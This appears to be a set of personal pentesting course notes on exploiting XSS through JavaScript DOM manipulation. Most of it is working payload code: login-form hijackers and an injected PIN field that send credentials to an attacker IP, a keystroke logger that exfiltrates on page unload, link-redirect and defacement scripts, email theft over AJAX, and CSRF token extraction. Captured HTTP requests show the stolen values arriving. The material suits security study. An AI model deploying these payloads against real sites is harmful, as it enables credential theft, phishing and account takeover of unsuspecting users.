## JS DOM
*With the object model,* JavaScript gets all the power it needs to create dynamic HTML:
1. change all the HTML elements in the page
2. change all the HTML attributes in the page
3. change all the CSS styles in the page
4. remove existing HTML elements and attributes
5. add new HTML elements and attributes
6. react to all existing HTML events in the page
7. create new HTML events in the page


## JS modifiying HTML: if you found an XSS and you would like to change different things on the page as to lure the user to do certain activities
```html
<!DOCTYPE html>
<html>
	<head>
		<title>Test page</title>
	</head>
	<body>
		<div id="mydiv">my text</div>
		<p>par 1</p>
		<p>par 2</p>
		<script>
			document.getElementById("mydiv").innerHTML = "JS modified";
			document.getElementsByTagName("p")[0].innerHTML = "JS changed paragraph one"
			document.getElementsByTagName("p")[1].innerHTML = "JS changed paragraph two"
		</script>
		<button onclick='document.getElementById("mydiv").innerHTML = "Button Clicked";'>Click Me!</button>
	</body>
</html>
```

## executing JS functions on events
```html
<!DOCTYPE html>
<html>
	<script>
		function JSfunc() {
			document.write("you got JS funced!");
		}
	</script>
	<button onclick='JSfunc();'>Click Me!</button>
</html>
```

## JS: modifying links: redirection to malicious links (less suspicious since user triggers the action by clicking the link)
```html
<!DOCTYPE html>
<html>
	<a href="https://www.google.com"> visit google</a>
	<script>
		// first link
		document.getElementsByTagName("a")[0].href = "https://www.youtube.com"
		var links = document.getElementsByTagName("a")
		// looping over all links
		for (i = 0; i < links.length; i++){
			links[i].href = "https://www.youtube.com"
			// for proof
			links[i].innerHTML = "links modified"
		}
	</script>
</html>
```

## JS: hijacking submission input
```html
<!DOCTYPE html>
<html>
  <input name=username id=username>
  <input type=password name=password>
  <button>Login</button>
  <script>
    function hijackThemCreds(){
      var username = document.getElementsByTagName("input")[0].value;
      var password = document.getElementsByTagName("input")[1].value;
      new Image().src="http://20.20.20.129/?u="+username+"&p="+password;
    }
    document.getElementsByTagName("button")[0].onclick = hijackThemCreds;
  </script>
</html>
```
### output
```
GET /?u=victim&p=V1ct1mP@ssw0rd HTTP/1.1
Host: 20.20.20.129
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: http://nix
Connection: keep-alive
Referer: http://nix/
```

## JS: hijacking submission input II (example using forms) --> making the XMLHTTP request's `async` = false is important to catch the creds before submission. else the submission will take place before the script execution
```html
<form  method="post">
  <div class="container">
    <label for="uname"><b>Username</b></label>
    <input type="text" placeholder="Enter Username" name="uname" required>

    <label for="psw"><b>Password</b></label>
    <input type="password" placeholder="Enter Password" name="psw" required>

    <button type="submit">Login</button>
    <label>
      <input type="checkbox" checked="checked" name="remember"> Remember me
    </label>
  </div>

  <div class="container" style="background-color:#f1f1f1">
    <button type="button" class="cancelbtn">Cancel</button>
    <span class="psw">Forgot <a href="#">password?</a></span>
  </div>
</form> 
<script>
  function stealCredz() {
    var u = document.forms[0].elements[0].value;
    var p = document.forms[0].elements[1].value;
    const xhttp = new XMLHttpRequest();
    xhttp.open("get","http://20.20.20.129/TakeMyCredz?u="+u+"&p="+p, false);
    xhttp.send();
  }
  document.forms[0].onsubmit = stealCredz;
</script>
</html>
```
### response
```
GET /TakeMyCredz?u=victim&p=V1ct1mP@ssw0rd HTTP/1.1
Host: 20.20.20.129
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: http://nix
Connection: keep-alive
Referer: http://nix/
```

## JS adding a new form field: Malicious example: adding a PIN code form field to steal the pincode of the user
```html
 <form  method="post">
  <div class="imgcontainer">
    <img src="img_avatar2.png" alt="Avatar" class="avatar">
  </div>

  <div class="container">
    <label for="uname"><b>Username</b></label>
    <input type="text" placeholder="Enter Username" name="uname" required>

    <label for="psw"><b>Password</b></label>
    <input type="password" placeholder="Enter Password" name="psw" required>

    <!-- spoof
    <label for="pin"><b>Pin Code</b></label>
    <input type="password" placeholder="Enter Pin Code" maxlength="4" name="pin" required>
    spoof -->

    <button type="submit">Login</button>
    <label>
      <input type="checkbox" checked="checked" name="remember"> Remember me
    </label>
  </div>

  <div class="container" style="background-color:#f1f1f1">
    <button type="button" class="cancelbtn">Cancel</button>
    <span class="psw">Forgot <a href="#">password?</a></span>
  </div>
</form> 
<script>
  var input = document.createElement("input");

  input.setAttribute("type","password");
  input.setAttribute("placeholder", "Enter Pin Code");
  input.setAttribute("maxlength", "4");
  input.setAttribute("name", "ping");
  input.setAttribute("required", true);

  var previous = document.getElementsByTagName('button')[0];

  var label = document.createElement("label");

  label.setAttribute("for","pin");

  var bold = document.createElement("b");

  bold.innerHTML = "Pin Code";

  label.appendChild(bold);

  document.getElementsByTagName('div')[1].insertBefore(label, previous);
  document.getElementsByTagName('div')[1].insertBefore(input, previous);

  function stealCredz() {
    var u = document.forms[0].elements[0].value;
    var p = document.forms[0].elements[1].value;
    const xhttp = new XMLHttpRequest();
    xhttp.open("get","http://20.20.20.129/TakeMyCredz?u="+u+"&p="+p, false);
    xhttp.send();
  }
  document.forms[0].onsubmit = stealCredz;

</script>
</html>
```
### response
```
GET /TakeMyCredz?Username=victim&Password=V1ct1mP@ssw0rd&PincCode=4433 HTTP/1.1
Host: 20.20.20.129
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: http://nix
Connection: keep-alive
Referer: http://nix/
```

## JS: replacing a login form with a "down for maintenance message and a redirection to another website"
```html
</style>
 <form  method="post">
  <div class="imgcontainer">
    <img src="img_avatar2.png" alt="Avatar" class="avatar">
  </div>

  <div class="container">
    <label for="uname"><b>Username</b></label>
    <input type="text" placeholder="Enter Username" name="uname" required>

    <label for="psw"><b>Password</b></label>
    <input type="password" placeholder="Enter Password" name="psw" required>

    <button type="submit">Login</button>
    <label>
      <input type="checkbox" checked="checked" name="remember"> Remember me
    </label>
  </div>
  <div class="container" style="background-color:#f1f1f1">
    <button type="button" class="cancelbtn">Cancel</button>
    <span class="psw">Forgot <a href="#">password?</a></span>
  </div>
</form> 
<script>
  // creating h1 replacement with a message
  var replacement = document.createElement('h1');
  replacement.innerHTML = 'Website is down for maintenance. Please visit ';

  // creating an anchor with a link
  var anchor = document.createElement('a');
  anchor.setAttribute('href','https://www.SecurityTube.net');
  anchor.innerHTML = 'SecurityTube.net'

  // adding the anchor as a child to the h1 element
  replacement.appendChild(anchor);

  // removing the last div, the login button
  document.getElementsByTagName('div')[2].remove();
  document.getElementsByTagName('button')[0].remove();

  // adding the maintenance message to the main div
  document.getElementsByTagName('div')[1].appendChild(replacement);

  // removing all labels and inputs
  const labels = document.querySelectorAll('label');
  labels.forEach(label => {label.remove();})

  const inputs = document.querySelectorAll('input');
  inputs.forEach(input => {input.remove();})
</script>
</html>
```
### another solution: creating a replacement div with all the needed components before remove the last 2 divs
```javascript
var replacement_div = document.createElement('div');

var replacement_msg = document.createElement('h1');
replacement_msg.innerHTML = 'Website is down for maintenance. Please visit ';

replacement_div.appendChild(replacement_msg);

var anchor = document.createElement('a');
anchor.setAttribute('href','https://www.SecurityTube.net');
anchor.innerHTML = 'SecurityTube.net'
replacement_msg.appendChild(anchor);

document.getElementsByTagName('div')[1].remove();
document.getElementsByTagName('div')[1].remove();

document.forms[0].appendChild(replacement_div);
```

## JS: making every element redirect to a website
```html
<html>
 <form  method="post">
  <div class="imgcontainer">
    <img src="img_avatar2.png" alt="Avatar" class="avatar">
  </div>

  <div class="container">
    <label for="uname"><b>Username</b></label>
    <input type="text" placeholder="Enter Username" name="uname" required>

    <label for="psw"><b>Password</b></label>
    <input type="password" placeholder="Enter Password" name="psw" required>

    <button type="submit">Login</button>
    <label>
      <input type="checkbox" checked="checked" name="remember"> Remember me
    </label>
  </div>
  <div class="container" style="background-color:#f1f1f1">
    <button type="button" class="cancelbtn">Cancel</button>
    <span class="psw">Forgot <a href="#">password?</a></span>
  </div>
</form> 
<script>
  function CaughtClick(tagName) {
    alert("Got your ass for clicking on the " + tagName.toLowerCase() + " element :D");
    location.href = 'https://www.pentesteracademy.com';
  }

  // this works only for when the elements within the body are clicked. any element outside won't trigger
  // document.body.addEventListener('click', CaughtClick, true);

  const elements = document.getElementsByTagName("*");
  for (var i = 0 ; i < elements.length ; i++){
    elements[i].setAttribute("onclick","CaughtClick(this.tagName);");
  }
</script>
</html>
```

## JS keylogger
```html
<html>
 <form  method="post">
  <div class="imgcontainer">
    <img src="img_avatar2.png" alt="Avatar" class="avatar">
  </div>

  <div class="container">
    <label for="uname"><b>Username</b></label>
    <input type="text" placeholder="Enter Username" name="uname" required>

    <label for="psw"><b>Password</b></label>
    <input type="password" placeholder="Enter Password" name="psw" required>

    <button type="submit">Login</button>
    <label>
      <input type="checkbox" checked="checked" name="remember"> Remember me
    </label>
  </div>
  <div class="container" style="background-color:#f1f1f1">
    <button type="button" class="cancelbtn">Cancel</button>
    <span class="psw">Forgot <a href="#">password?</a></span>
  </div>
</form> 
<script>
  var username_field_input = "";
  document.getElementsByTagName('input')[0].onkeypress = function(evt) {
    evt = evt || window.event;
    var charCode = evt.keyCode || evt.which;
    var charStr = String.fromCharCode(charCode);
    username_field_input += charStr;
    //alert(charStr);
  };

  var password_field_input = "";
  document.getElementsByTagName('input')[1].onkeypress = function(evt) {
    evt = evt || window.event;
    var charCode = evt.keyCode || evt.which;
    var charStr = String.fromCharCode(charCode);
    password_field_input += charStr;
    //alert(charStr);
  };

  window.onbeforeunload = function() {
    const xhttp = new XMLHttpRequest();
    xhttp.open("post","http://20.20.20.129", false);
    xhttp.send("LoggedKeyStrokesUsername="+username_field_input+"&LoggedKeyStrokesPassword="+password_field_input);
  };
</script>
</html>
```

## JS password POC
```html
<html>
 <form  method="post">
  <div class="imgcontainer">
    <img src="img_avatar2.png" alt="Avatar" class="avatar">
  </div>

  <div class="container">
    <label for="uname"><b>Username</b></label>
    <input type="text" placeholder="Enter Username" name="uname" required>

    <label for="psw"><b>Password</b></label>
    <input type="password" placeholder="Enter Password" name="psw" required>

    <button type="submit">Login</button>
    <label>
      <input type="checkbox" checked="checked" name="remember"> Remember me
    </label>
  </div>
  <div class="container" style="background-color:#f1f1f1">
    <button type="button" class="cancelbtn">Cancel</button>
    <span class="psw">Forgot <a href="#">password?</a></span>
  </div>
</form> 
<script>
	document.forms[0].onsubmit = function StealPassword(){
		alert(document.getElementsByTagName('input')[1].value);
	};
</script>
</html>
```

## loading external JS I: handy when the amount of javascript exceeds the limit
```html
<script src="http://127.0.0.1/script.js"></script>
```

## loading external JS II: creating a script tag :D
```javascript
var script = document.createElement('script');
script.src = "http://127.0.0.1/script.js";
document.getElementsByTagName('script')[0].appendChild(script);
```

## changing the source of an image
```javascript
// defacement
document.getElementsByTagName('img')[0].src = "http://127.0.0.1/replacement.jpg";
// sending information
document.getElementsByTagName('img')[0].src = "http://127.0.0.1/replacement.jpg?u=" + username + "&p=" + password;
```

## stealing creds from autofill using **fetch API**
```html
<html>
 <form  method="post">
  <div class="imgcontainer">
    <img src="img_avatar2.png" alt="Avatar" class="avatar">
  </div>

  <div class="container">
    <label for="uname"><b>Username</b></label>
    <input type="text" placeholder="Enter Username" name="uname" required>

    <label for="psw"><b>Password</b></label>
    <input type="password" placeholder="Enter Password" name="psw" required>

    <button type="submit">Login</button>
    <label>
      <input type="checkbox" checked="checked" name="remember"> Remember me
    </label>
  </div>
  <div class="container" style="background-color:#f1f1f1">
    <button type="button" class="cancelbtn">Cancel</button>
    <span class="psw">Forgot <a href="#">password?</a></span>
  </div>
</form> 
<script>
  function stealThemCredz() {
    if(this.value.length){
      fetch('http://20.20.20.129',{method:'POST',mode: 'no-cors',body:document.getElementsByTagName('input')[0].value+':'+this.value});
    }
  }
  document.getElementsByTagName('input')[1].onchange = stealThemCredz;
</script>
</html>
```

## execute code from text using `eval()`
```javascript
eval('alert("XSS!");')
```

## stealing email using JS and AJAX
```html
<html>
 <form  method="post">
  <div class="imgcontainer">
    <img src="img_avatar2.png" alt="Avatar" class="avatar">
  </div>

  <div class="container">
    <label for="uname"><b>Username</b></label>
    <input type="text" placeholder="Enter Username" name="uname" required>

    <label for="psw"><b>Password</b></label>
    <input type="password" placeholder="Enter Password" name="psw" required>

    <button type="submit">Login</button>
    <label>
      <input type="checkbox" checked="checked" name="remember"> Remember me
    </label>
  </div>
  <div class="container" style="background-color:#f1f1f1">
    <button type="button" class="cancelbtn">Cancel</button>
    <span class="psw">Forgot <a href="#">password?</a></span>
  </div>
</form> 
<script>
  var xhr1 = new XMLHttpRequest();

  xhr1.onreadystatechange = function () {
    if (xhr1.readyState == 4 && xhr1.status == 200) {
      var result = xhr1.responseText;

      var xhr2 = new XMLHttpRequest();
      xhr2.open("POST", "http://20.20.20.129/GotTheMail")
      xhr2.send("mail=" + result);
    }
  }

  xhr1.open("GET", "hello.txt");
  xhr1.send();
</script>
</html>
```
### outcome on kali
```
POST /GotTheMail HTTP/1.1
Host: 20.20.20.129
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/plain;charset=UTF-8
Content-Length: 24
Origin: http://127.0.0.1
Connection: keep-alive
Referer: http://127.0.0.1/

mail=whats@up.com
```

## JS to extract CSRF token and perform CSRF attack: just locate the CSRF token within the html and access it using JS
### if the CSRF token is in the url, the regular expressions example can be of help
```javascript
url = "https://www.victimsite.com/?csrftoken=95202460752969227078829139976552";
document.URL.match("csrftoken=(.*)")[1]; //this would return "95202460752969227078829139976552"
```

---

## HTML DOM Events List
[W3Schools](https://www.w3schools.com/jsref/dom_obj_event.asp)